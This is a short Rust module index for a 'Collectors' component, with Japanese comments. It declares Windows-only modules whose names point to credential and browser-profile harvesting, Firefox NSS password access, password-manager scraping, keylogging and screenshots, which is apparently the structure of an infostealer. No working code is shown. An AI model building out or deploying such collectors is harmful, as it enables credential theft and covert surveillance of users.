// Collectors module - データ収集機能
// 非Windows環境（Termux/Android等）では問題になりやすい収集モジュールをビルドから外す
// 必要に応じて機能フラグやOS条件で個別に有効化してください。

#[cfg(windows)]
pub mod auth_collector;
#[cfg(windows)]
pub mod browser_profiles;
#[cfg(windows)]
pub mod browser_scanner;
#[cfg(windows)]
pub mod firefox_nss;
#[cfg(windows)]
pub mod password_manager;
#[cfg(windows)]
pub mod system_info;
#[cfg(windows)]
pub mod key_mouse_logger;
#[cfg(windows)]
pub mod screenshot_data;

// safe, non-secret diagnostics (cross-platform friendly)
pub mod network_diagnostics;

#[cfg(windows)]
pub use auth_collector::*;
#[cfg(windows)]
pub use browser_profiles::*;
#[cfg(windows)]
pub use browser_scanner::*;
#[cfg(windows)]
pub use firefox_nss::*;
#[cfg(windows)]
pub use password_manager::*;
#[cfg(windows)]
pub use system_info::*;
#[cfg(windows)]
pub use key_mouse_logger::*;
#[cfg(windows)]
pub use screenshot_data::*;
pub use network_diagnostics::*;
